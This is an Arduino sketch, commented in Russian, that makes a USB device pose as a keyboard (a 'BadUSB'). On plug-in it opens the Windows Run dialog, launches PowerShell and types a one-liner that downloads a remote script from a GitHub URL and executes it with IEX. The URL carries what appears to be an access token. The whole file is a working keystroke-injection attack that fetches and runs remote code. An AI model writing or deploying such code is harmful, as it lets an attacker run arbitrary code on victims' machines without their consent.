#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);  // Подождать, чтобы пользователь успел подключить устройство
  openPowerShellAndExecuteScript();
}

void loop() {
  // Пустой цикл, код будет выполняться только один раз при старте
}

void openPowerShellAndExecuteScript() {
  // Открываем меню "Run" (WIN + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  // Вводим "powershell" и нажимаем Enter
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);

  // Вводим ваш скрипт PowerShell для выполнения
  Keyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kreniov/BadUsb/main/powershell.ps1?token=GHSAT0AAAAAACGMEHLNCBGDDFCN5FZJDZ6MZG46AHA');");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // Задержка, чтобы ускорить ввод команд
  delay(500);
}
